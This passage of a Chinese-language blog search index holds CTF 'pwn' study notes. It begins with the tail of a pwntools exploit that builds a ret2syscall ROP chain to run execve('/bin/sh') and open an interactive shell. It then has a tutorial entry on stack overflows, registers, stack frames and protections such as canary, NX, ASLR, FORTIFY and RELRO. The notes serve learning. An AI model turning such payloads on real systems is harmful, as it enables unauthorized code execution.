class="hljs-params">(<span class="hljs-number">0</span>x080be408)</span></span><br><span class="hljs-function"><span class="hljs-title">int_0x80</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x08049421)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">flat</span><span class="hljs-params">([b<span class="hljs-string">&quot;a&quot;</span> * offset, pop_eax, <span class="hljs-number">0</span>xb, pop_edx_ecx_ebx, p32(<span class="hljs-number">0</span>), p32(<span class="hljs-number">0</span>), bin_sh, int_0x80])</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure></p>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn基础知识</title>
    <link href="/2023/04/01/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/04/01/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是pwn？"><a href="#什么是pwn？" class="headerlink" title="什么是pwn？"></a>什么是pwn？</h2><p>“pwn”是一个黑客语法的俚语，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。感觉就是向目标发送特定的数据，使其执行我们发送的恶意代码，以获取目标机器的最高使用权限。 </p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>概念：在计算机中，当要表示的数据超出计算机所使用的数据的表示范围时，则产生数据的溢出。</p><p>产生的原因：</p><ol><li>使用非类型安全(non-type-safe)的语言，如：C/C++等。</li><li>以不可靠的方式存取或者复制内存缓冲区。</li><li>编译器设置的内存缓冲区太靠近关键数据结构。</li></ol><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>ESP(X86)/RSP(X64)：用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</p><p>EBP(X86)/RBP(X64)：用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p><p>EIP(X86)/RIP(X64)：用来存储即将要执行的程序指令的地址。</p><p>其他更多寄存器可参考：<a href="https://blog.csdn.net/ComputerInBook/article/details/122955217">https://blog.csdn.net/ComputerInBook/article/details/122955217</a></p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p>32位X86架构下汇编指令有两种格式intel与AT&amp;T</p><p>intel：寄存器名称和数值前无符号。</p><p>AT&amp;T：寄存器名字前加“%”，数值前加“$”。</p><p>链接1：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/x86-instructions">X86汇编指令</a></p><p>链接2：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/x64-instructions">x64汇编指令</a></p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作。</p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong></p><p>函数调用栈的工作过程：<a href="https://www.bilibili.com/video/BV1Xt411x7Dr/?spm_id_from=trigger_reload&amp;vd_source=75b0e2176ed6115febad096a2562ae52">32位程序动画演示</a></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别：</p><p>x86：函数参数在函数返回地址的上方</p><p>x64：</p><ol><li>System Ⅴ AMD64 ABI(Linux、FreeBSD、macOS等采用)中前六个整型或指针参数依次保存在RDI，RSI，RDX，RCX，R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。</li></ol><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧就是一个函数执行的环境：函数参数、函数的局部变量、函数执行完后返回到哪里等等。</p><p>每一个栈帧代表的就是一个未运行完的函数。</p><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ol><li><p>程序必须向栈上写入数据。</p></li><li><p>写入的数据大小没有被良好地控制。</p></li><li></li></ol><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR（PIE）的话各个系统调用的地址就是随机化的。</p><ol><li><p>canary(栈保护)</p><p> 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p></li><li><p>NX（DEP）</p><p> NX即No-execute(不可执行)的意思，NX(DEP)的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行指令。</p></li><li><p>PIE（ASLR）<br> 一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br> 内存地址随机化机制(address space layout randomization)，有以下三种情况<br> <strong>0-表示关闭进程地址空间随机化。<br> 1-表示将mmp的基址，satck和vdso页面随机化。<br> 2-表示在1的基础上增加栈的随机化。</strong><br> 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止进攻者在堆栈上运行恶意代码。</p></li><li><p>FORTIFY<br> 这个保护机制防止缓冲区溢出攻击。gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p></li><li><p>RELRO<br> 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
